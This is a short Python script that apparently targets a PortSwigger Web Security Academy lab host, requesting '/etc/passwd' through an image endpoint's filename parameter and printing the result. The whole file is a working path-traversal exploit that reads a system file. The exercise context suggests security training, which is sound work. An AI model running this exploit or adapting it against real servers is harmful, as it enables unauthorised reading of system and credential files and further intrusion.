import requests

DOMAIN = "0aaf00ca042cd838810d9de3008f0093.web-security-academy.net"
URL = f"https://{DOMAIN}/image?filename="

def get_file_content(path):
    response = requests.get(URL + path)
    print(response.text)

get_file_content("/etc/passwd")